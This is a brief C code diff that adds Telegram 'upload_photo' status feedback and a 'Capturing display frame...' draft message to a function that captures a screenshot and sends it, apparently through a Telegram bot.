@@ -233,6 +233,9 @@ int screenshot_capture_display_and_send(const char *display_target, const char *
     return 0;
   }
 
+  (void)telegram_send_chat_action("upload_photo");
+  (void)telegram_send_message_draft(101, "📸 <i>Capturing display frame...</i>");
+
   if (!screenshot_capture_display(target, &image_data, &image_size, &mime_type, &filename)) {
     c2t_log_warning("screenshot", "Screenshot capture failed for target '%s'", target);
     atomic_store_explicit(&capture_in_progress, 0, memory_order_release);
